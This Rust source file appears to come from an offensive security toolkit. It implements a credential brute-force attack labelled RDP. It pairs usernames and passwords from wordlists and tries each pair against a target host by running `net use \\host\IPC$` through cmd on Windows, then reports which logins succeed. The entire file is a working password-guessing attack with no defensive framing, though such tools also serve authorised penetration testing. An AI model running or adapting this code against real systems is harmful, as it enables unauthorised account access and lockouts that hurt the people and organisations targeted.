use std::process::Command;

use crate::helpers::wordlists;

// Define a credential structure
#[derive(Debug, Clone)]
pub struct RdpCredential {
    pub host: String,
    pub username: String,
    pub password: String,
}

pub fn recon(host: String, _users: Option<Vec<String>>, _passwords: Option<Vec<String>>) {
    let users = _users.unwrap_or(wordlists::get_users(None, false));
    let passwords: Vec<String> = _passwords.unwrap_or(wordlists::get_passwords(None, false));

    #[cfg(target_os = "windows")]
    {
        let mut creds = Vec::new();

        for user in users {
            for pass in passwords.clone() {
                creds.push(RdpCredential {
                    host: host.clone(),
                    username: user.clone(),
                    password: pass.clone(),
                });
            }
        }

        for _cred in creds.iter() {
            println!(
                "[RDP] Bruteforce Attack | host: {} | username: {} | password: {}",
                _cred.host,
                _cred.username,
                _cred.password
            );
            connect(&_cred.host, &_cred.username, &_cred.password);
        }
    }
}

#[cfg(target_os = "windows")]
fn connect(host: &str, username: &str, password: &str) {
    // Run `net use` command to check login credentials
    let output = Command::new("cmd")
        .args(&["/C", &format!("net use \\\\{}\\IPC$ /user:{} {}", host, username, password)])
        .output()
        .expect("Failed to execute command");

    // Convert command output to string
    let result = String::from_utf8_lossy(&output.stdout);
    let error_result = String::from_utf8_lossy(&output.stderr);

    if result.contains("successfully") {
        println!("Login successful!");
    } else {
        println!("Login failed: {}", error_result);
    }
}
